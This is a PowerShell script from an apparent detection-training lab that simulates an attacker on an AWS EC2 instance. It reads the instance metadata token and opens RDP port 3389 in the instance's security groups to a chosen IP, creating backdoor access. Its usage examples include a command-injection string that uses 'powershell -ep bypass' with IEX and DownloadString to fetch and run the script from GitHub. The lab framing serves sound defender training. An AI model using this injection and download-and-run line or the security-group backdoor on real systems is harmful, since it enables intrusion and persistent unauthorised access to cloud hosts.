<#
.SYNOPSIS
    Enable RDP Access via AWS Security Group Modification
    
.DESCRIPTION
    This script modifies the AWS security group to allow RDP (3389) access from a specified IP.
    It can be executed via command injection on the vulnerable web application.
    
    The EC2 instance has IAM permissions to modify security groups tagged with the project tag.
    
.PARAMETER AllowIP
    The IP address to allow RDP access from (CIDR format, e.g., 1.2.3.4/32)
    If not specified, attempts to detect the caller's public IP

.PARAMETER Remove
    Remove RDP access instead of adding it

.EXAMPLE
    # Via command injection on the web app:
    127.0.0.1 & powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SilentProcess87/LockDownLab/main/ad-scripts/Enable-RDPAccess.ps1'); Enable-RDPAccess -AllowIP '203.0.113.50/32'"

.EXAMPLE
    # Run locally on the server:
    .\Enable-RDPAccess.ps1 -AllowIP "203.0.113.50/32"

.EXAMPLE
    # Auto-detect IP (uses checkip service):
    .\Enable-RDPAccess.ps1

.EXAMPLE
    # Remove RDP access:
    .\Enable-RDPAccess.ps1 -AllowIP "203.0.113.50/32" -Remove

.NOTES
    Author: Security Training Team
    Purpose: Cortex XDR Detection Training - Simulates attacker opening backdoor access
#>

param(
    [Parameter(Mandatory=$false)]
    [string]$AllowIP = "",
    
    [Parameter(Mandatory=$false)]
    [switch]$Remove
)

function Enable-RDPAccess {
    param(
        [string]$AllowIP = "",
        [switch]$Remove
    )
    
    $ErrorActionPreference = "Continue"
    
    Write-Host @"

 ██████╗ ██████╗ ██████╗      █████╗  ██████╗ ██████╗███████╗███████╗███████╗
 ██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
 ██████╔╝██║  ██║██████╔╝    ███████║██║     ██║     █████╗  ███████╗███████╗
 ██╔══██╗██║  ██║██╔═══╝     ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
 ██║  ██║██████╔╝██║         ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
 ╚═╝  ╚═╝╚═════╝ ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
                                                                              
           AWS Security Group RDP Access Controller
           
"@ -ForegroundColor Red

    # Get instance metadata
    Write-Host "[*] Gathering instance metadata..." -ForegroundColor Cyan
    
    try {
        # Get instance ID from metadata service
        $Token = Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token-ttl-seconds" = "21600"} -Method PUT -Uri "http://169.254.169.254/latest/api/token" -TimeoutSec 2
        $InstanceId = Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token" = $Token} -Uri "http://169.254.169.254/latest/meta-data/instance-id" -TimeoutSec 2
        $Region = (Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token" = $Token} -Uri "http://169.254.169.254/latest/meta-data/placement/availability-zone" -TimeoutSec 2) -replace '.$'
        
        Write-Host "[+] Instance ID: $InstanceId" -ForegroundColor Green
        Write-Host "[+] Region: $Region" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to get instance metadata: $_" -ForegroundColor Red
        return $false
    }
    
    # If no IP specified, try to detect caller's IP
    if ([string]::IsNullOrEmpty($AllowIP)) {
        Write-Host "[*] No IP specified, attempting to detect public IP..." -ForegroundColor Cyan
        try {
            $PublicIP = (Invoke-RestMethod -Uri "https://checkip.amazonaws.com" -TimeoutSec 5).Trim()
            $AllowIP = "$PublicIP/32"
            Write-Host "[+] Detected IP: $AllowIP" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Could not detect public IP. Please specify -AllowIP parameter" -ForegroundColor Red
            return $false
        }
    }
    
    # Validate CIDR format
    if ($AllowIP -notmatch '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$') {
        # Try to add /32 if just IP provided
        if ($AllowIP -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
            $AllowIP = "$AllowIP/32"
            Write-Host "[*] Added /32 suffix: $AllowIP" -ForegroundColor Yellow
        }
        else {
            Write-Host "[!] Invalid IP format. Use CIDR notation (e.g., 1.2.3.4/32)" -ForegroundColor Red
            return $false
        }
    }
    
    # Check if AWS CLI is available, if not use AWS Tools for PowerShell
    $useAwsCli = $false
    try {
        $awsVersion = aws --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            $useAwsCli = $true
            Write-Host "[+] Using AWS CLI" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[*] AWS CLI not found, will try AWS PowerShell module" -ForegroundColor Yellow
    }
    
    if ($useAwsCli) {
        # Use AWS CLI
        
        # Get security groups for this instance
        Write-Host "[*] Finding security groups for instance $InstanceId..." -ForegroundColor Cyan
        $sgJson = aws ec2 describe-instances --instance-ids $InstanceId --region $Region --query "Reservations[0].Instances[0].SecurityGroups[*].GroupId" --output json 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[!] Failed to get security groups: $sgJson" -ForegroundColor Red
            return $false
        }
        
        $SecurityGroups = $sgJson | ConvertFrom-Json
        Write-Host "[+] Security Groups: $($SecurityGroups -join ', ')" -ForegroundColor Green
        
        foreach ($sgId in $SecurityGroups) {
            Write-Host "[*] Processing security group: $sgId" -ForegroundColor Cyan
            
            if ($Remove) {
                # Remove RDP rule
                Write-Host "[*] Removing RDP access from $AllowIP..." -ForegroundColor Yellow
                $result = aws ec2 revoke-security-group-ingress --group-id $sgId --protocol tcp --port 3389 --cidr $AllowIP --region $Region 2>&1
                
                if ($LASTEXITCODE -eq 0) {
                    Write-Host "[+] Successfully removed RDP access from $AllowIP in $sgId" -ForegroundColor Green
                }
                else {
                    Write-Host "[!] Failed or rule didn't exist: $result" -ForegroundColor Yellow
                }
            }
            else {
                # Add RDP rule
                Write-Host "[*] Adding RDP access for $AllowIP..." -ForegroundColor Cyan
                $result = aws ec2 authorize-security-group-ingress --group-id $sgId --protocol tcp --port 3389 --cidr $AllowIP --region $Region 2>&1
                
                if ($LASTEXITCODE -eq 0) {
                    Write-Host "[+] Successfully added RDP access for $AllowIP in $sgId" -ForegroundColor Green
                }
                elseif ($result -match "InvalidPermission.Duplicate") {
                    Write-Host "[*] Rule already exists in $sgId" -ForegroundColor Yellow
                }
                else {
                    Write-Host "[!] Failed to add rule: $result" -ForegroundColor Red
                }
            }
        }
    }
    else {
        # Try AWS PowerShell module
        Write-Host "[*] Attempting to use AWS PowerShell module..." -ForegroundColor Cyan
        
        try {
            Import-Module AWSPowerShell.NetCore -ErrorAction SilentlyContinue
            Import-Module AWSPowerShell -ErrorAction SilentlyContinue
            
            # Get security groups
            $Instance = Get-EC2Instance -InstanceId $InstanceId -Region $Region
            $SecurityGroups = $Instance.Instances[0].SecurityGroups.GroupId
            
            Write-Host "[+] Security Groups: $($SecurityGroups -join ', ')" -ForegroundColor Green
            
            foreach ($sgId in $SecurityGroups) {
                Write-Host "[*] Processing security group: $sgId" -ForegroundColor Cyan
                
                $IpPermission = New-Object Amazon.EC2.Model.IpPermission
                $IpPermission.IpProtocol = "tcp"
                $IpPermission.FromPort = 3389
                $IpPermission.ToPort = 3389
                $IpPermission.IpRanges = @($AllowIP)
                
                if ($Remove) {
                    try {
                        Revoke-EC2SecurityGroupIngress -GroupId $sgId -IpPermission $IpPermission -Region $Region
                        Write-Host "[+] Successfully removed RDP access from $AllowIP in $sgId" -ForegroundColor Green
                    }
                    catch {
                        Write-Host "[!] Failed to remove: $_" -ForegroundColor Yellow
                    }
                }
                else {
                    try {
                        Grant-EC2SecurityGroupIngress -GroupId $sgId -IpPermission $IpPermission -Region $Region
                        Write-Host "[+] Successfully added RDP access for $AllowIP in $sgId" -ForegroundColor Green
                    }
                    catch {
                        if ($_.Exception.Message -match "InvalidPermission.Duplicate") {
                            Write-Host "[*] Rule already exists in $sgId" -ForegroundColor Yellow
                        }
                        else {
                            Write-Host "[!] Failed: $_" -ForegroundColor Red
                        }
                    }
                }
            }
        }
        catch {
            Write-Host "[!] AWS PowerShell module not available: $_" -ForegroundColor Red
            Write-Host "[*] Installing AWS CLI..." -ForegroundColor Cyan
            
            # Download and install AWS CLI
            try {
                $awsCliUrl = "https://awscli.amazonaws.com/AWSCLIV2.msi"
                $installerPath = "$env:TEMP\AWSCLIV2.msi"
                
                Invoke-WebRequest -Uri $awsCliUrl -OutFile $installerPath -UseBasicParsing
                Start-Process msiexec.exe -ArgumentList "/i `"$installerPath`" /qn" -Wait
                
                # Refresh PATH
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
                
                Write-Host "[+] AWS CLI installed. Please run the script again." -ForegroundColor Green
                return $false
            }
            catch {
                Write-Host "[!] Failed to install AWS CLI: $_" -ForegroundColor Red
                return $false
            }
        }
    }
    
    # Display connection info
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor Cyan
    if (-not $Remove) {
        Write-Host "[+] RDP ACCESS ENABLED!" -ForegroundColor Green
        Write-Host ""
        Write-Host "  Connect via RDP:" -ForegroundColor White
        
        # Get public IP of this instance
        try {
            $PublicIP = Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token" = $Token} -Uri "http://169.254.169.254/latest/meta-data/public-ipv4" -TimeoutSec 2
            Write-Host "    mstsc /v:$PublicIP" -ForegroundColor Yellow
        }
        catch {
            Write-Host "    mstsc /v:<INSTANCE_PUBLIC_IP>" -ForegroundColor Yellow
        }
        
        Write-Host ""
        Write-Host "  Credentials:" -ForegroundColor White
        Write-Host "    User: Administrator or MAJORCORP\Administrator" -ForegroundColor Yellow
        Write-Host "    Pass: (from LAB_ADMIN_PASSWORD secret)" -ForegroundColor Yellow
    }
    else {
        Write-Host "[+] RDP ACCESS REMOVED!" -ForegroundColor Yellow
    }
    Write-Host "============================================================" -ForegroundColor Cyan
    
    return $true
}

# Run if called directly with parameters
if ($AllowIP -or $Remove) {
    Enable-RDPAccess -AllowIP $AllowIP -Remove:$Remove
}
